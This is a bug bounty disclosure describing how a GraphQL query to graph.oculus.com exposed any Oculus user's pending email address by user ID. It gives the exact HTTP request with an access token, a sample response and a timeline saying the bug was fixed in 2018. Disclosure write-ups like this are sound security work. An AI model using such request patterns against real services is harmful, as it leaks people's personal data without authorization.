---
title: View Pending Email of Any Oculus User via GraphQL
description: A GraphQL endpoint exposed pending (unconfirmed) email addresses for Oculus users by ID, leaking PII.
date: 2018-05-22 
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
An unauthorised GraphQL query could return the pending (unconfirmed) email address of any Oculus user by supplying their user ID. Pending email addresses are personal data and should not be exposed to arbitrary requesters. This issue leaks users' PII (email) before confirmation and can aid targeted attacks or account takeover attempts.

**Impact:** Disclosure of a user's new/alternate email address prior to confirmation, violating privacy and increasing attack surface for phishing and account compromise.

---

## ⚙️ Steps to Reproduce

1. **UserA** adds a new email address to his Oculus profile: `https://secure.oculus.com/my/profile/` (email remains in *pending* state until confirmed).  
2. **UserB** (Attacker) issues the following GraphQL request, replacing `User_ID` with UserA_ID and using a valid Oculus access token :

#### Request
```http
GET /graphql?q=node(User_ID){pending_email}&access_token=OC|660728964057742| HTTP/1.1
Host: graph.oculus.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close
```

#### Response (example)
```json
{"User_ID":{"pending_email":"pending_email@email.User_ID.com"}}
```

**Result:** The attacker retrieves the victim's pending email address without authorization.

---

### 🧱 Expected Behavior
Pending emails (and other unverified contact data) must be considered private and should only be accessible to authorized account holders or through verified flows. 

---

## Timeline

- **Reported:** May 22, 2018 
- **Triaged:** May 23, 2018 
- **Fixed:** June 16, 2018  
- **Reward:** June 20, 2018 - $1,500

---
